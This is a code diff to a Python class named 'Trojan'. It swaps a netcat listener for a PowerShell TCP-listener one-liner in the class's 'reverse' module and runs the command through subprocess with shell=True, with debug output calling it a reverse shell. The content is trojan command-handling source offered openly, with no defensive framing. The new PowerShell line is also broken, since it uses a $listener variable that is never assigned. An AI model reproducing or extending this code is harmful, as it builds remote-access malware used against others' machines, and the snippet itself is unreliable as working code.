@@ -84,8 +84,8 @@ class Trojan:
                 module_name = command.get('module')
                 if module_name:
                     if module_name == 'reverse':
-                        # Run netcat to listen on port 8000
-                        shell_command = 'nc -lvnp 8000'
+                        # Use PowerShell to start a listener
+                        shell_command = 'powershell -Command "New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 8000).Start(); while ($true) { $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $bytesRead = $stream.Read($buffer, 0, $buffer.Length); if ($bytesRead -gt 0) { $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead); [Console]::WriteLine($data); } $client.Close(); }"'
                         try:
                             print(f"[*] Executing reverse shell command: {shell_command}")  # Debug output
                             result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
